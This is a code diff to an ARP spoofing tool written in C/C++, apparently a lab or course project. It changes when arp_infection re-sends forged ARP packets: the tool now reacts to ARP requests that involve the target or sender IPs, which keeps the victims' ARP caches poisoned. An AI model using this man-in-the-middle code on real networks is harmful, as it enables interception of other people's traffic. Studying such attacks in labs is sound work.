@@ -79,7 +79,10 @@ void arp_infection(void* arg)
     {
         /*
             1. ARP Request
-            2. dmac == attacer mac
+            AND
+            2. tip == target ip
+            OR
+            3. sip == sender ip or target ip --> because sender could learn by arp req
         */
         struct pcap_pkthdr *header;
         const u_char *packet;
@@ -90,7 +93,7 @@ void arp_infection(void* arg)
             if (packet != NULL)
             {
                 memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
-                if (arp.op_ == htons(ArpHdr::Request) && sarg.a_mac == arp.tmac())
+                if (arp.op_ == htons(ArpHdr::Request) && (arp.tip() == sarg.t_ip || (arp.sip() == sarg.s_ip || arp.sip() == sarg.t_ip)))
                 {
                     send_arp(sarg.handle,p);
                 }
@@ -123,18 +126,6 @@ Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip)
                 cnt++;
                 break;
             }
-            /*
-            Pthread_mutex_lock(&mutex);
-            int res = pcap_next_ex(handle, &header, &packet);
-            Pthread_mutex_unlock(&mutex);
-            if (res == 0)
-                continue;
-            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
-            {
-                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-                break;
-            }
-            */
             packet = read_packet(handle);
             if (packet != NULL)
             {
@@ -227,5 +218,6 @@ void recover(void* arg)
 {
     Relay_arg rarg = *((Relay_arg*)arg);
     Sem_post(&sem);
+    //cout << pthread_self() << " : " <<string(rarg.p.arp_.tip_) << endl;
     send_arp(rarg.handle,rarg.p);
 }
